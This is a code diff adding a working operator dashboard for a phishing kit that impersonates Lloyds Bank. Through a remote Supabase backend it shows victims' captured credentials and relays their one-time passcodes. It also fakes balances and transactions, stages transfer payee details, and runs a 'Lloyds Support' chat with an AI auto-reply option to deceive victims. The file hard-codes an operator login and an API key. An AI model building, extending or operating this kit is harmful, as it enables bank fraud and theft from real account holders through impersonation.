@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lloyds Admin Control</title>
+    <link rel="icon" href="https://www.lloydsbankinggroup.com/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="https://www.lloydsbankinggroup.com/favicon.ico" type="image/x-icon">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; }
+        body { background-color:#1e1e2d; color:#fff; display:flex; height:100vh; overflow:hidden; }
+        .login-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:#151521; display:flex; align-items:center; justify-content:center; z-index:1000; }
+        .login-box { background:#1e1e2d; padding:40px; border-radius:10px; width:400px; box-shadow:0 10px 30px rgba(0,0,0,0.5); text-align:center; }
+        .login-box h2 { margin-bottom:20px; color:#00d2ff; }
+        .login-box input { width:100%; padding:12px; margin-bottom:20px; border:1px solid #333; background:#151521; color:#fff; border-radius:6px; font-size:14px; }
+        .login-box button { background-color:#00d2ff; color:#000; padding:14px; width:100%; border:none; border-radius:6px; font-weight:bold; cursor:pointer; transition:background 0.3s; font-size:15px; }
+        .login-box button:hover { background-color:#00b8e6; }
+        .dashboard { display:none; flex:1; padding:20px; flex-direction:column; overflow-y:auto; width:100%; }
+        .header { margin-bottom:20px; border-bottom:1px solid #333; padding-bottom:15px; display:flex; justify-content:space-between; align-items:center; }
+        .header h1 { color:#00d2ff; font-size:22px; }
+        .btn-clear { background-color:#ff4d4d; color:white; padding:8px 16px; border:none; border-radius:6px; cursor:pointer; font-weight:bold; font-size:13px; }
+        .panels { display:flex; gap:20px; flex-wrap:wrap; }
+        .panel { background:#2a2a3f; border-radius:10px; padding:15px; flex:1; min-width:280px; display:flex; flex-direction:column; }
+        .panel h2 { margin-bottom:10px; color:#a0a0b8; font-size:16px; border-bottom:1px solid #3a3a52; padding-bottom:8px; }
+        .log-area { flex:1; overflow-y:auto; background:#151521; padding:12px; border-radius:6px; margin-bottom:10px; max-height:300px; }
+        .log-area p { margin-bottom:8px; padding-bottom:8px; border-bottom:1px dashed #333; }
+        .log-area strong { color:#00d2ff; }
+        .chat-message { margin-bottom:10px; padding:8px 12px; border-radius:8px; width:fit-content; max-width:80%; }
+        .chat-message.user { background:#3a3a52; align-self:flex-start; }
+        .chat-message.admin { background:#006a4d; align-self:flex-end; margin-left:auto; }
+        .chat-input-area { display:flex; gap:8px; }
+        .chat-input-area input { flex:1; padding:10px; background:#151521; border:1px solid #3a3a52; color:white; border-radius:6px; }
+        .chat-input-area button { background-color:#00d2ff; color:#000; padding:0 16px; border:none; border-radius:6px; cursor:pointer; font-weight:bold; }
+        .settings-group { background:#151521; padding:12px; border-radius:6px; margin-bottom:10px; }
+        .settings-group p { color:#a0a0b8; margin-bottom:8px; font-size:13px; }
+        .settings-group input, .settings-group select { width:100%; padding:8px; margin-bottom:8px; background:#1e1e2d; border:1px solid #3a3a52; color:white; border-radius:4px; font-size:13px; }
+        .settings-group button { background:#00d2ff; color:black; padding:8px 12px; border:none; border-radius:4px; font-weight:bold; cursor:pointer; width:100%; font-size:13px; }
+        .settings-group button.green { background:#5cb85c; color:white; }
+        .settings-group button.red { background:#d9534f; color:white; }
+        .status-msg { margin-top:6px; font-size:12px; color:#5cb85c; }
+        .login-error { color:#d9534f; margin-top:10px; font-size:13px; display:none; }
+        @media (max-width:768px) {
+            .panels { flex-direction:column; }
+            .panel { min-width:100%; }
+            .dashboard { padding:10px; }
+            .login-box { width:90%; padding:20px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Login Overlay -->
+    <div class="login-overlay" id="loginOverlay">
+        <div class="login-box">
+            <h2>System Admin Access</h2>
+            <p style="margin-bottom:20px;color:#a0a0b8;">Authenticate to view victim activities.</p>
+            <input type="text" id="loginUsername" placeholder="Username" value="kyung-zi">
+            <input type="password" id="loginPassword" placeholder="Password" value="mysonmeanstheworldtome$">
+            <button id="loginBtn">Login</button>
+            <p class="login-error" id="loginError">Please enter both username and password.</p>
+        </div>
+    </div>
+
+    <!-- Main Dashboard -->
+    <div class="dashboard" id="dashboard">
+        <div class="header">
+            <h1><span style="color:#fff;">Admin</span> Dashboard</h1>
+            <button class="btn-clear" id="clearAllBtn">Clear All Data</button>
+        </div>
+        
+        <div class="panels">
+            <!-- Credentials Panel -->
+            <div class="panel">
+                <h2>Captured Credentials & Activity</h2>
+                <div class="log-area" id="credentialsLog">
+                    <p style="color:#666;">Waiting for victim to submit forms...</p>
+                </div>
+            </div>
+            
+            <!-- Settings Panel -->
+            <div class="panel" style="flex:0.7;">
+                <h2>OTP & Display Settings</h2>
+                <!-- Account Status Control -->
+                <div class="settings-group" style="text-align:center; border:2px solid #d9534f;">
+                    <p style="color:white; font-weight:bold;"><i class="fas fa-lock"></i> Victim Account Status</p>
+                    <p style="font-size:11px;">If Locked, victim sees "Account Closed" and cannot transfer.</p>
+                    <div style="display:flex; gap:10px; margin-top:10px;">
+                        <button class="red" id="btnLockAccount">Lock Account</button>
+                        <button class="green" id="btnUnlockAccount">Unlock Account</button>
+                    </div>
+                    <div id="lockStatusDisplay" style="margin-top:10px; font-weight:bold; color:#a0a0b8;">Current: UNKNOWN</div>
+                </div>
+
+
+                
+                <!-- Welcome Name Control -->
+                <div class="settings-group">
+                    <p><i class="fas fa-user"></i> Victim Welcome Name</p>
+                    <input type="text" id="adminWelcomeName" placeholder="e.g. Kyung">
+                    <button id="btnSetWelcome">Update Name</button>
+                    <div id="welcomeNameStatus" class="status-msg"></div>
+                </div>
+
+                <!-- Display Email -->
+                <div class="settings-group">
+                    <p><i class="fas fa-envelope"></i> OTP Display Email</p>
+                    <input type="email" id="adminDisplayEmail" placeholder="e.g. user@gmail.com">
+                    <button id="btnSetEmail">Update Email</button>
+                    <div id="currentEmailDisplay" class="status-msg"></div>
+                </div>
+
+                <!-- Account Username/Password -->
+                <div class="settings-group">
+                    <p><i class="fas fa-user-lock"></i> Victim Account Credentials</p>
+                    <input type="text" id="adminAcctUsername" placeholder="Display username">
+                    <input type="text" id="adminAcctPassword" placeholder="Display password">
+                    <button id="btnUpdateCreds">Update Credentials</button>
+                    <div id="acctCredStatus" class="status-msg"></div>
+                </div>
+
+                
+                <!-- Domestic Transfer Configuration -->
+                <div class="settings-group" style="border:2px solid #3498db;">
+                    <p style="color:white; font-weight:bold;"><i class="fas fa-money-check-alt"></i> Domestic Transfer Verifier</p>
+                    <p style="font-size:11px; margin-bottom:8px;">Generate expected details for "STARK Building Materials UK".</p>
+                    <select id="domBank" style="width:100%; padding:8px; margin-bottom:8px; background:#1e1e2d; border:1px solid #3a3a52; color:white; border-radius:4px;">
+                        <option value="">-- Select Target Bank --</option>
+                        <option value="Lloyds Bank PLC (Includes Halifax, Bank of Scotland)">Lloyds Bank PLC (Includes Halifax, Bank of Scotland)</option>\n<option value="HSBC UK Bank Plc (Includes First Direct, M&S Bank)">HSBC UK Bank Plc (Includes First Direct, M&S Bank)</option>\n<option value="Barclays Bank UK PLC">Barclays Bank UK PLC</option>\n<option value="National Westminster Bank Plc (NatWest, includes RBS)">National Westminster Bank Plc (NatWest, includes RBS)</option>\n<option value="Santander UK Plc (Includes TSB, Virgin Money)">Santander UK Plc (Includes TSB, Virgin Money)</option>\n<option value="Metro Bank PLC">Metro Bank PLC</option>\n<option value="Clydesdale Bank Plc (Trading as Virgin Money)">Clydesdale Bank Plc (Trading as Virgin Money)</option>\n<option value="Yorkshire Bank (Trading as Virgin Money)">Yorkshire Bank (Trading as Virgin Money)</option>\n<option value="Northern Bank Limited (Danske Bank group, NI)">Northern Bank Limited (Danske Bank group, NI)</option>\n<option value="AIB Group (UK) P.L.C.">AIB Group (UK) P.L.C.</option>\n<option value="Monzo Bank Limited">Monzo Bank Limited</option>\n<option value="Starling Bank Limited">Starling Bank Limited</option>\n<option value="Revolut Bank UK Ltd">Revolut Bank UK Ltd</option>\n<option value="Atom Bank PLC">Atom Bank PLC</option>\n<option value="Chase (J.P. Morgan Europe Limited)">Chase (J.P. Morgan Europe Limited)</option>\n<option value="OakNorth Bank plc">OakNorth Bank plc</option>\n<option value="Allica Bank Limited">Allica Bank Limited</option>\n<option value="Tandem Bank">Tandem Bank</option>\n<option value="Kroo Bank Ltd">Kroo Bank Ltd</option>\n<option value="Zopa Bank Limited">Zopa Bank Limited</option>\n<option value="The Bank of London">The Bank of London</option>\n<option value="Coutts & Company">Coutts & Company</option>\n<option value="C. Hoare & Co.">C. Hoare & Co.</option>\n<option value="Investec Bank PLC">Investec Bank PLC</option>\n<option value="Handelsbanken plc">Handelsbanken plc</option>\n<option value="Citibank UK Limited">Citibank UK Limited</option>\n<option value="Bank of China (UK) Limited">Bank of China (UK) Limited</option>\n<option value="Goldman Sachs International Bank">Goldman Sachs International Bank</option>
+                    </select>
+                    <input type="text" id="domName" placeholder="Full Name">
+                    <input type="text" id="domSort" placeholder="Sort Code (XX-XX-XX)">
+                    <input type="text" id="domAcc" placeholder="Account Number (8 digits)">
+                    <button class="green" id="btnSetDom">Generate Domestic Transfer</button>
+                    <div id="domStatus" class="status-msg"></div>
+                    <div id="activeGeneratedDom" style="margin-top:10px; padding:10px; background:#151521; border-left:3px solid #3498db; border-radius:4px; font-size:12px; display:none;">
+                        <strong style="color:#00d2ff;">Active Generated Details:</strong><br>
+                        <span style="color:#a0a0b8;">Bank:</span> <span id="dispDomBank" style="color:white;"></span><br>
+                        <span style="color:#a0a0b8;">Name:</span> <span id="dispDomName" style="color:white;"></span><br>
+                        <span style="color:#a0a0b8;">Sort:</span> <span id="dispDomSort" style="color:white;"></span><br>
+                        <span style="color:#a0a0b8;">Acc:</span> <span id="dispDomAcc" style="color:white;"></span>
+                    </div>
+                </div>
+
+                <!-- OTP Generator -->
+                <div class="settings-group" style="text-align:center;">
+                    <p>Generate OTP Code</p>
+                    <button class="green" id="btnGenOtp">Generate Code</button>
+                    <div id="generatedOtpDisplay" style="margin-top:12px; font-size:28px; color:#00d2ff; font-weight:bold; letter-spacing:4px;">------</div>
+                </div>
+
+                <!-- Card Details -->
+                <div class="settings-group">
+                    <p><i class="fas fa-credit-card"></i> Card Display Name</p>
+                    <input type="text" id="adminCardName" placeholder="e.g. EMRIOUS KYUNG ZING">
+                    <p><i class="fas fa-dollar-sign"></i> Card Balance</p>
+                    <input type="text" id="adminCardBalance" placeholder="e.g. $140,000.00">
+                    <button id="btnUpdateCard">Update Card</button>
+                    <div id="cardStatus" class="status-msg"></div>
+                </div>
+
+                <!-- Transaction Manager -->
+                <div class="settings-group">
+                    <p><i class="fas fa-list"></i> Add Transaction</p>
+                    <input type="text" id="txDesc" placeholder="Description (e.g. Direct Deposit)">
+                    <input type="text" id="txDate" placeholder="Date (e.g. June 3, 2026)">
+                    <input type="text" id="txAmount" placeholder="Amount (e.g. $40,000.00)">
+                    <select id="txType"><option value="deposit">Deposit</option><option value="withdrawal">Withdrawal</option></select>
+                    <select id="txStatusSel"><option value="success">Success</option><option value="pending">Pending</option><option value="failed">Failed</option></select>
+                    <button class="green" id="btnAddTx">Add Transaction</button>
+                    <button class="red" id="btnClearTx" style="margin-top:6px;">Clear All Transactions</button>
+                </div>
+                <div id="adminTxList" style="background:#151521; padding:10px; border-radius:6px; max-height:200px; overflow-y:auto;">
+                    <p style="color:#666;">No custom transactions set.</p>
+                </div>
+            </div>
+            
+            <!-- Live Chat Panel -->
+            <div class="panel">
+                <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #3a3a52; padding-bottom:8px; margin-bottom:10px;">
+                    <h2 style="border:none; padding:0; margin:0;">Live Chat (Lloyds Support)</h2>
+                    <div>
+                        <span style="color:#a0a0b8; font-size:12px; margin-right:6px;">AI Auto-Reply</span>
+                        <button id="aiToggleBtn" style="background:#d9534f; color:white; padding:3px 10px; border:none; border-radius:4px; font-weight:bold; cursor:pointer; font-size:11px;">OFF</button>
+                    </div>
+                </div>
+                <div class="log-area" id="chatLog" style="display:flex;flex-direction:column;">
+                    <p style="color:#666;">Chat history will appear here.</p>
+                </div>
+                <div class="chat-input-area">
+                    <input type="text" id="adminChatInput" placeholder="Reply as Lloyds Support...">
+                    <button id="btnSendChat">Send</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var SUPABASE_URL = 'https://ursrbmvgrpjhuogfimal.supabase.co';
+        var SUPABASE_KEY = 'sb_publishable_tPbGnhGMinGYFI5tc4KbvA_7Gu2Ketw';
+
+        var globalState = {};
+        var previousStateStr = '{}';
+        var pollingInterval = null;
+
+        // ===== SUPABASE STATE MANAGEMENT =====
+        async function getFullState() {
+            try {
+                var res = await fetch(SUPABASE_URL + '/rest/v1/otp_state?select=expectedOtp&id=eq.1', {
+                    headers: { 'apikey': SUPABASE_KEY, 'Authorization': 'Bearer ' + SUPABASE_KEY }
+                });
+                if (!res.ok) return {};
+                var rows = await res.json();
+                var val = (rows && rows.length > 0) ? rows[0].expectedOtp : null;
+                if (!val) return {};
+                try { return JSON.parse(val); } catch(e) { return { expectedOtp: val }; }
+            } catch (e) { return {}; }
+        }
+
+        async function setFullState(stateObj) {
+            try {
+                await fetch(SUPABASE_URL + '/rest/v1/otp_state', {
+                    method: 'POST',
+                    headers: {
+                        'apikey': SUPABASE_KEY,
+                        'Authorization': 'Bearer ' + SUPABASE_KEY,
+                        'Content-Type': 'application/json',
+                        'Prefer': 'resolution=merge-duplicates'
+                    },
+                    body: JSON.stringify({ id: 1, expectedOtp: JSON.stringify(stateObj) })
+                });
+            } catch(e) {}
+        }
+
+        async function setSyncItem(key, value) {
+            var state = await getFullState();
+            if (value === null) {
+                delete state[key];
+            } else {
+                state[key] = value;
+            }
+            await setFullState(state);
+            globalState = state;
+        }
+
+        function getSyncItem(key) {
+            return globalState[key] !== undefined ? globalState[key] : null;
+        }
+
+        // ===== LOGIN =====
+        document.getElementById('loginBtn').addEventListener('click', function() {
+            doLogin();
+        });
+
+        document.getElementById('loginUsername').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') doLogin();
+        });
+
+        document.getElementById('loginPassword').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') doLogin();
+        });
+
+        function doLogin() {
+            var u = document.getElementById('loginUsername').value;
+            var p = document.getElementById('loginPassword').value;
+            if (u && p) {
+                document.getElementById('loginOverlay').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'flex';
+                document.getElementById('loginError').style.display = 'none';
+                startPolling();
+            } else {
+                document.getElementById('loginError').style.display = 'block';
+            }
+        }
+
+        // ===== POLLING =====
+        function startPolling() {
+            if (pollingInterval) return;
+            // Initial fetch
+            pollOnce();
+            pollingInterval = setInterval(pollOnce, 1000);
+        }
+
+        async function pollOnce() {
+            try {
+                globalState = await getFullState();
+            } catch(e) {
+                return;
+            }
+
+            // Sound Notification
+            var newStateStr = JSON.stringify(globalState);
+            if (newStateStr !== previousStateStr && previousStateStr !== '{}') {
+                try {
+                    var audio = new Audio('https://www.soundjay.com/buttons/sounds/button-47.mp3');
+                    audio.play().catch(function(){});
+                } catch(e){}
+            }
+            previousStateStr = newStateStr;
+
+            // Poll Credentials
+            var logs = getSyncItem('adminLogs');
+            if (logs) {
+                document.getElementById('credentialsLog').innerHTML = logs;
+            }
+
+            // Poll Chat History
+            var chats = getSyncItem('chatHistory');
+            if (chats) {
+                var initialMessage = '<div class="chat-message admin"><strong>Lloyds Support:</strong> Hello, we\'re here to help you verify your accounts for the withdrawal. Please enter your credentials above and we\'ll proceed.</div>';
+                document.getElementById('chatLog').innerHTML = initialMessage + chats;
+                var chatArea = document.getElementById('chatLog');
+                chatArea.scrollTop = chatArea.scrollHeight;
+            }
+
+            // Update AI Toggle Button
+            var aiState = getSyncItem('aiAutoReply');
+            var aiBtn = document.getElementById('aiToggleBtn');
+            if (aiBtn) {
+                if (aiState) { aiBtn.style.background = '#5cb85c'; aiBtn.innerText = 'ON'; }
+                else { aiBtn.style.background = '#d9534f'; aiBtn.innerText = 'OFF'; }
+            }
+
+            
+            // Poll Welcome Name
+            var curName = getSyncItem('welcomeName');
+            if (curName && document.activeElement !== document.getElementById('adminWelcomeName')) {
+                document.getElementById('adminWelcomeName').value = curName;
+            }
+
+            // Poll Display Email
+            var currentEmail = getSyncItem('displayEmail');
+            if (currentEmail) {
+                var dEmailEl = document.getElementById('currentEmailDisplay');
+                if (dEmailEl) dEmailEl.innerText = 'Current: ' + currentEmail;
+                if (document.activeElement !== document.getElementById('adminDisplayEmail')) {
+                    document.getElementById('adminDisplayEmail').value = currentEmail;
+                }
+            }
+
+            // Poll Account Credentials
+            var acctUser = getSyncItem('acctUsername');
+            var acctPass = getSyncItem('acctPassword');
+            if (acctUser && document.activeElement !== document.getElementById('adminAcctUsername')) {
+                document.getElementById('adminAcctUsername').value = acctUser;
+            }
+            if (acctPass && document.activeElement !== document.getElementById('adminAcctPassword')) {
+                document.getElementById('adminAcctPassword').value = acctPass;
+            }
+
+            
+            // Poll Domestic Details
+            var dBank = getSyncItem('expectedDomBank');
+            var dName = getSyncItem('expectedDomName');
+            var dSort = getSyncItem('expectedDomSort');
+            var dAcc = getSyncItem('expectedDomAcc');
+            
+            if (dBank && document.activeElement !== document.getElementById('domBank')) document.getElementById('domBank').value = dBank;
+            if (dName && document.activeElement !== document.getElementById('domName')) document.getElementById('domName').value = dName;
+            if (dSort && document.activeElement !== document.getElementById('domSort')) document.getElementById('domSort').value = dSort;
+            if (dAcc && document.activeElement !== document.getElementById('domAcc')) document.getElementById('domAcc').value = dAcc;
+            
+            if (dBank && dName && dSort && dAcc) {
+                document.getElementById('activeGeneratedDom').style.display = 'block';
+                document.getElementById('dispDomBank').innerText = dBank;
+                document.getElementById('dispDomName').innerText = dName;
+                document.getElementById('dispDomSort').innerText = dSort;
+                document.getElementById('dispDomAcc').innerText = dAcc;
+            } else {
+                document.getElementById('activeGeneratedDom').style.display = 'none';
+            }
+
+            // Poll Card Details
+            var cName = getSyncItem('cardName');
+            var cBal = getSyncItem('cardBalance');
+            if (cName && document.activeElement !== document.getElementById('adminCardName')) {
+                document.getElementById('adminCardName').value = cName;
+            }
+            if (cBal && document.activeElement !== document.getElementById('adminCardBalance')) {
+                document.getElementById('adminCardBalance').value = cBal;
+            }
+
+            // Poll Transactions
+            var txs = getSyncItem('transactions');
+            if (txs && Array.isArray(txs) && txs.length > 0) {
+                var txHtml = '';
+                txs.forEach(function(tx, idx) {
+                    var color = tx.type === 'deposit' ? '#5cb85c' : (tx.status === 'failed' ? '#d9534f' : '#fff');
+                    var sign = tx.type === 'deposit' ? '+' : '-';
+                    var statStr = tx.status === 'pending' ? ' (Pending)' : (tx.status === 'failed' ? ' (Failed)' : '');
+                    txHtml += '<div style="background:#1e1e2d; padding:8px; margin-bottom:6px; border-radius:4px; display:flex; justify-content:space-between; align-items:center;">' +
+                        '<div><strong>' + tx.desc + '</strong>' + statStr + '<br><span style="color:#a0a0b8; font-size:11px;">' + tx.date + '</span></div>' +
+                        '<div style="display:flex; align-items:center; gap:8px;"><span style="color:' + color + '; font-weight:bold;">' + sign + tx.amount + '</span>' +
+                        '<button onclick="removeTx(' + idx + ')" style="background:#d9534f; color:white; border:none; border-radius:3px; padding:2px 6px; cursor:pointer; font-size:10px;">X</button></div></div>';
+                });
+                document.getElementById('adminTxList').innerHTML = txHtml;
+            } else {
+                document.getElementById('adminTxList').innerHTML = '<p style="color:#666;">No custom transactions set.</p>';
+            }
+
+            // Action buttons
+            injectAdminActions();
+        }
+
+        function injectAdminActions() {
+            var logArea = document.getElementById('credentialsLog');
+
+            var sBank = getSyncItem('bankStatus');
+            if (sBank === 'submitted' && !document.getElementById('btnReqOtpBank')) {
+                logArea.innerHTML += '<div id="actionBank_1" style="margin-top:8px; padding:8px; background:#3a3a52; border-radius:6px;"><strong style="color:orange;">Action Required (Bank Verification):</strong><br><button id="btnReqOtpBank" onclick="requestOtp(\'bankStatus\')" style="margin-top:4px; padding:4px 8px; background:#d9534f; color:white; border:none; border-radius:4px; cursor:pointer;">Request OTP</button></div>';
+            } else if (sBank === 'otp_submitted' && !document.getElementById('btnApproveBank')) {
+                var oldAction = document.getElementById('actionBank_1');
+                if (oldAction) oldAction.style.display = 'none';
+                logArea.innerHTML += '<div id="actionBank_2" style="margin-top:8px; padding:8px; background:#3a3a52; border-radius:6px;"><strong style="color:orange;">Action Required (Bank Verification):</strong><br><button id="btnApproveBank" onclick="approveStep(\'bankStatus\')" style="margin-top:4px; padding:4px 8px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Process</button></div>';
+            }
+
+            var stx = getSyncItem('txStatus');
+            if (stx === 'otp_submitted' && !document.getElementById('btnApproveTx')) {
+                logArea.innerHTML += '<div id="actionTx_2" style="margin-top:8px; padding:8px; background:#3a3a52; border-radius:6px;"><strong style="color:orange;">Action Required (Transaction History):</strong><br><button id="btnApproveTx" onclick="approveStep(\'txStatus\')" style="margin-top:4px; padding:4px 8px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Process</button></div>';
+            }
+
+            var sLog = getSyncItem('loginStatus');
+            if (sLog === 'otp_submitted' && !document.getElementById('btnApproveLogin')) {
+                logArea.innerHTML += '<div id="actionLogin_2" style="margin-top:8px; padding:8px; background:#3a3a52; border-radius:6px;"><strong style="color:orange;">Action Required (Initial Login):</strong><br><button id="btnApproveLogin" onclick="approveStep(\'loginStatus\')" style="margin-top:4px; padding:4px 8px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Login</button></div>';
+            }
+        }
+
+        // ===== ADMIN ACTIONS =====
+        async function requestOtp(statusKey) {
+            await setSyncItem(statusKey, 'pending_otp');
+            alert('Requested OTP from victim.');
+        }
+
+        async function approveStep(statusKey) {
+            await setSyncItem(statusKey, 'approved');
+            alert('Process approved.');
+            var ids = { bankStatus: 'actionBank_2', txStatus: 'actionTx_2', loginStatus: 'actionLogin_2' };
+            var el = document.getElementById(ids[statusKey]);
+            if (el) el.style.display = 'none';
+        }
+
+        // ===== BUTTON EVENT LISTENERS =====
+
+        // Update the account lock toggle events
+        var btnLock = document.getElementById('btnLockAccount');
+        var btnUnlock = document.getElementById('btnUnlockAccount');
+        if (btnLock) {
+            btnLock.onclick = async function() {
+                await setSyncItem('accountLocked', true);
+                document.getElementById('lockStatusDisplay').innerHTML = '<span style="color:#d9534f;">LOCKED</span>';
+            };
+        }
+        if (btnUnlock) {
+            btnUnlock.onclick = async function() {
+                await setSyncItem('accountLocked', false);
+                document.getElementById('lockStatusDisplay').innerHTML = '<span style="color:#5cb85c;">UNLOCKED</span>';
+            };
+        }
+
+
+        // Send Chat
+        document.getElementById('btnSendChat').addEventListener('click', sendAdminMessage);
+        document.getElementById('adminChatInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') sendAdminMessage();
+        });
+
+        async function sendAdminMessage() {
+            var input = document.getElementById('adminChatInput').value;
+            if (input.trim() === '') return;
+            var chatEntry = '<div class="chat-message admin"><strong>Lloyds Support:</strong> ' + input + '</div>';
+            var currentChats = getSyncItem('chatHistory') || '';
+            await setSyncItem('chatHistory', currentChats + chatEntry);
+            document.getElementById('adminChatInput').value = '';
+        }
+
+        
+        // Set Domestic Transfer Details
+        var btnSetDom = document.getElementById('btnSetDom');
+        if (btnSetDom) {
+            btnSetDom.onclick = async function() {
+                var bk = document.getElementById('domBank').value.trim();
+                var nm = document.getElementById('domName').value.trim();
+                var sc = document.getElementById('domSort').value.trim();
+                var ac = document.getElementById('domAcc').value.trim();
+                if (bk && nm && sc && ac) {
+                    await setSyncItem('expectedDomBank', bk);
+                    await setSyncItem('expectedDomName', nm);
+                    await setSyncItem('expectedDomSort', sc);
+                    await setSyncItem('expectedDomAcc', ac);
+                    document.getElementById('domStatus').innerText = 'Details generated and ready!';
+                    setTimeout(function(){ document.getElementById('domStatus').innerText = ''; }, 3000);
+                } else {
+                    alert('Please select a Bank and fill out Name, Sort Code, and Account Number.');
+                }
+            };
+        }
+
+        // Generate OTP
+        document.getElementById('btnGenOtp').addEventListener('click', async function() {
+            var code = Math.floor(100000 + Math.random() * 900000).toString();
+            await setSyncItem('expectedOtp', code);
+            document.getElementById('generatedOtpDisplay').innerText = code;
+            document.getElementById('adminChatInput').value = 'Your verification code is: ' + code;
+        });
+
+        
+        // Set Welcome Name
+        var btnSetWelcome = document.getElementById('btnSetWelcome');
+        if (btnSetWelcome) {
+            btnSetWelcome.onclick = async function() {
+                var name = document.getElementById('adminWelcomeName').value.trim();
+                if (name) {
+                    await setSyncItem('welcomeName', name);
+                    document.getElementById('welcomeNameStatus').innerText = 'Welcome name updated!';
+                    setTimeout(function(){ document.getElementById('welcomeNameStatus').innerText = ''; }, 3000);
+                }
+            };
+        }
+
+        // Set Display Email
+        document.getElementById('btnSetEmail').addEventListener('click', async function() {
+            var email = document.getElementById('adminDisplayEmail').value.trim();
+            if (email) {
+                await setSyncItem('displayEmail', email);
+                alert('Display email updated to: ' + email);
+                document.getElementById('currentEmailDisplay').innerText = 'Current: ' + email;
+            }
+        });
+
+        // Update Account Credentials
+        document.getElementById('btnUpdateCreds').addEventListener('click', async function() {
+            var user = document.getElementById('adminAcctUsername').value.trim();
+            var pass = document.getElementById('adminAcctPassword').value.trim();
+            if (user) await setSyncItem('acctUsername', user);
+            if (pass) await setSyncItem('acctPassword', pass);
+            document.getElementById('acctCredStatus').innerText = 'Credentials updated!';
+            setTimeout(function(){ document.getElementById('acctCredStatus').innerText = ''; }, 3000);
+        });
+
+        // Update Card Details
+        document.getElementById('btnUpdateCard').addEventListener('click', async function() {
+            var name = document.getElementById('adminCardName').value.trim();
+            var bal = document.getElementById('adminCardBalance').value.trim();
+            if (name) await setSyncItem('cardName', name);
+            if (bal) await setSyncItem('cardBalance', bal);
+            document.getElementById('cardStatus').innerText = 'Card details updated!';
+            setTimeout(function(){ document.getElementById('cardStatus').innerText = ''; }, 3000);
+        });
+
+        // Add Transaction
+        document.getElementById('btnAddTx').addEventListener('click', async function() {
+            var desc = document.getElementById('txDesc').value.trim();
+            var date = document.getElementById('txDate').value.trim();
+            var amount = document.getElementById('txAmount').value.trim();
+            var type = document.getElementById('txType').value;
+            var status = document.getElementById('txStatusSel').value;
+            if (!desc || !date || !amount) { alert('Please fill out Description, Date, and Amount'); return; }
+            var currentTxs = getSyncItem('transactions') || [];
+            if (!Array.isArray(currentTxs)) currentTxs = [];
+            currentTxs.unshift({ desc: desc, date: date, amount: amount, type: type, status: status });
+            await setSyncItem('transactions', currentTxs);
+            document.getElementById('txDesc').value = '';
+            document.getElementById('txDate').value = '';
+            document.getElementById('txAmount').value = '';
+        });
+
+        // Remove single transaction
+        async function removeTx(index) {
+            var currentTxs = getSyncItem('transactions') || [];
+            if (!Array.isArray(currentTxs)) return;
+            currentTxs.splice(index, 1);
+            if (currentTxs.length === 0) {
+                await setSyncItem('transactions', null);
+            } else {
+                await setSyncItem('transactions', currentTxs);
+            }
+        }
+
+        // Clear All Transactions
+        document.getElementById('btnClearTx').addEventListener('click', async function() {
+            if (confirm('Clear all custom transactions?')) {
+                await setSyncItem('transactions', null);
+            }
+        });
+
+        // AI Toggle
+        document.getElementById('aiToggleBtn').addEventListener('click', async function() {
+            var currentState = getSyncItem('aiAutoReply') || false;
+            await setSyncItem('aiAutoReply', !currentState);
+        });
+
+        // Clear All Data
+        document.getElementById('clearAllBtn').addEventListener('click', async function() {
+            if (confirm('Clear all captured data and chat history?')) {
+                await setFullState({});
+                globalState = {};
+                document.getElementById('credentialsLog').innerHTML = '<p style="color:#666;">Waiting for victim to submit forms...</p>';
+                document.getElementById('chatLog').innerHTML = '';
+            }
+        });
+    </script>
+</body>
+</html>
